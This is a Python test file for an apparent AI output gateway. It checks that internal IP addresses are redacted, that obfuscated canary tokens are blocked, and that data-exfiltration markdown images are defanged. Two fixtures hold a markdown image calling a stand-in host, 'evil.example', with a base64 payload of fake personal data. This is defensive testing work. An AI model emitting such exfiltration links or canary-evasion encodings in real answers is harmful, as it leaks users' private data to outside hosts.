"""GW33 task 10.1: STRICT_WITHHOLD and INCREMENTAL equivalents for every new class and action
(offline equivalent, not the live gate). Property 1 (restated) and Property 14 (hold bound)."""
from __future__ import annotations

import base64
import random

from gateway_v2.domain import Action, Category, StreamingMode
from gateway_v2.edge.canary_inject import CanaryTicket
from tests.e2e.gw33_support import TOKEN, plan_of, rule, run, split

_ITERATIONS = 150
_IPS = ("10.12.4.9", "192.168.1.77", "172.16.8.3", "127.0.0.1", "169.254.169.254")
_STRICT = StreamingMode.STRICT_WITHHOLD
_INCR = StreamingMode.INCREMENTAL
_PAYLOAD = base64.urlsafe_b64encode(b"user=alice;ssn=123-45-6789;card=4111").decode()


def _ip_plan(mode: StreamingMode, action: Action):  # type: ignore[no-untyped-def]
    return plan_of(mode, rule("out_ip_leak", Category.IP_LEAK, action, "output.ip_leak",
                              template="[internal address]"))


def test_strict_ip_leak_with_every_action_never_releases_the_address() -> None:
    """Feature: gw33-output-parity, Property 1: No raw leak. Validates 1.7, 2.7, 5.7, 7.5."""
    # Feature: gw33-output-parity, Property 1: No raw leak after rewrite, redact or defang
    rng = random.Random(33_001)
    for _ in range(_ITERATIONS):
        ip = rng.choice(_IPS)
        text = f"The host is {ip} and also db.internal ok."
        for action in (Action.REDACT, Action.REWRITE, Action.FLAG):
            result = run(_ip_plan(_STRICT, action), split(text, rng))
            if action is Action.FLAG:
                assert ip in result.released and result.stats.review_required is True  # type: ignore[attr-defined]
                continue
            assert ip not in result.released and "db.internal" not in result.released
            assert result.codes == []
            marker = "[internal address]" if action is Action.REWRITE else "[REDACTED]"
            assert marker in result.released
            assert result.stats.bytes_action == action.value  # type: ignore[attr-defined]
        blocked = run(_ip_plan(_STRICT, Action.BLOCK), split(text, rng))
        assert blocked.released == "" and blocked.codes == ["output_blocked"]


def test_strict_exfil_image_is_defanged_or_blocked_never_delivered() -> None:
    # Feature: gw33-output-parity, Property 1: No raw leak after rewrite, redact or defang
    rng = random.Random(33_101)
    text = f"Summary done. ![x](https://evil.example/log?d={_PAYLOAD}) Bye."
    for action in (Action.REDACT, Action.REWRITE):
        for _ in range(_ITERATIONS):
            plan = plan_of(_STRICT, rule("out_exfil", Category.EXFIL, action, "output.exfil",
                                         template="[image removed]"))
            result = run(plan, split(text, rng))
            assert "evil.example" not in result.released and _PAYLOAD not in result.released
            assert result.released.startswith("Summary done. ") and result.released.endswith(" Bye.")
    blocked = run(plan_of(_STRICT, rule("out_exfil", Category.EXFIL, Action.BLOCK,
                                        "output.exfil")), split(text, rng))
    assert blocked.released == "" and blocked.codes == ["output_blocked"]


def test_strict_canary_is_never_delivered_plain_or_obfuscated() -> None:
    # Feature: gw33-output-parity, Property 10: Canary secrecy and detection
    rng = random.Random(33_110)
    ticket = CanaryTicket(TOKEN)
    plan = plan_of(_STRICT, rule("out_canary", Category.CANARY, Action.BLOCK, "output.canary"))
    forms = [TOKEN, TOKEN.upper(), "\u200b".join(TOKEN), "".join(f"%{ord(c):02x}" for c in TOKEN)]
    for form in forms:
        for _ in range(60):
            result = run(plan, split(f"leaked: {form} end", rng), ticket=ticket)
            assert result.released == "" and result.codes == ["output_blocked"]
            assert result.stats.canary_leaked is True  # type: ignore[attr-defined]


def test_incremental_plain_canary_is_held_and_blocked_before_release() -> None:
    """INCREMENTAL: a plain-form canary is one word run, held to completion (D-26)."""
    # Feature: gw33-output-parity, Property 10: Canary secrecy and detection
    rng = random.Random(33_111)
    ticket = CanaryTicket(TOKEN)
    plan = plan_of(_INCR, rule("out_canary", Category.CANARY, Action.BLOCK, "output.canary"))
    for _ in range(_ITERATIONS):
        text = f"The secret reference is {TOKEN}. Thanks."
        result = run(plan, split(text, rng), ticket=ticket)
        assert TOKEN not in result.released
        assert result.codes == ["output_blocked"]
        assert result.stats.canary_leaked is True  # type: ignore[attr-defined]
        assert result.released.startswith("The secret reference is"[: len(result.released)])


def test_incremental_obfuscated_canary_is_detected_and_terminates() -> None:
    """D-26: an obfuscated prefix MAY be released in INCREMENTAL; the stream still terminates."""
    # Feature: gw33-output-parity, Property 10: Canary secrecy and detection
    rng = random.Random(33_112)
    ticket = CanaryTicket(TOKEN)
    plan = plan_of(_INCR, rule("out_canary", Category.CANARY, Action.BLOCK, "output.canary"))
    spaced = "\u200b".join(TOKEN)
    for _ in range(80):
        result = run(plan, split(f"ref {spaced} tail", rng), ticket=ticket)
        assert result.codes == ["output_blocked"]
        assert result.stats.canary_leaked is True  # type: ignore[attr-defined]


def test_incremental_ip_and_exfil_and_grounding_are_flag_only_at_final() -> None:
    rng = random.Random(33_120)
    plan = plan_of(
        _INCR,
        rule("out_ip_leak", Category.IP_LEAK, Action.FLAG, "output.ip_leak"),
        rule("out_exfil", Category.EXFIL, Action.FLAG, "output.exfil"),
    )
    text = f"host 10.0.0.9 and ![x](https://evil.example/p?d={_PAYLOAD}) done"
    for _ in range(40):
        result = run(plan, split(text, rng))
        assert result.released == text  # nothing held, nothing altered
        assert result.codes == []
        assert result.stats.review_required is True  # type: ignore[attr-defined]
        assert result.stats.output_action == "flag"  # type: ignore[attr-defined]


def test_incremental_with_no_new_rule_is_byte_identical_and_holds_nothing() -> None:
    rng = random.Random(33_130)
    plan = plan_of(_INCR, rule("r-pii", Category.PII, Action.REDACT))
    text = "plain text with 10.0.0.1 and nothing else"
    result = run(plan, split(text, rng))
    assert result.released == text and result.stats.review_required is False  # type: ignore[attr-defined]
    assert result.stats.bytes_action == "allow"  # type: ignore[attr-defined]


def test_rewrite_in_incremental_force_release_terminates_not_silently_passes() -> None:
    """D-8: a REWRITE finding whose prefix was force-released ends with forced_release_tradeoff."""
    from gateway_v2.domain import Decision, Disposition, FindingDisposition, Span, Transformation
    from gateway_v2.egress.holdback_tradeoff import TRADE_OFF_TERMINATE, derive_trade_off_outcome

    finding = Decision(
        Disposition.REWRITE, (FindingDisposition("d", Disposition.REWRITE, 0),),
        (Transformation("rewrite", Span(0, 3), "[x]"),), (), "v", ("r",), (),
    )
    assert derive_trade_off_outcome(finding) == TRADE_OFF_TERMINATE
